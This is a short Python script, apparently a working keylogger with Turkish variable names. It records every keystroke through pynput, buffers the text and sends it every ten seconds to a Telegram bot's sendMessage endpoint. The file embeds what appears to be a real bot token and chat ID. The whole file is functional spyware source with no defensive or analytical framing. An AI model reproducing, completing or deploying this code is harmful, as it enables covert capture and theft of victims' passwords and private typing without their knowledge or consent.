from pynput import keyboard
import requests
import threading

TOKEN = "7648795358:AAGOjP3j3VDQ8ApW0GECDH25xuQFlGup564"
CHAT_ID = "8137983447"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

aralik = 10
text = ""
def yolla():
    global text
    try:
        response = requests.get(
        TELEGRAM_API_URL,
        params={"chat_id": CHAT_ID, "text": text}
)
        text = ""
        timer = threading.Timer(aralik, yolla)
        timer.start()
    except:
        print("Hata Oluştu!")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    yolla()
    listener.join()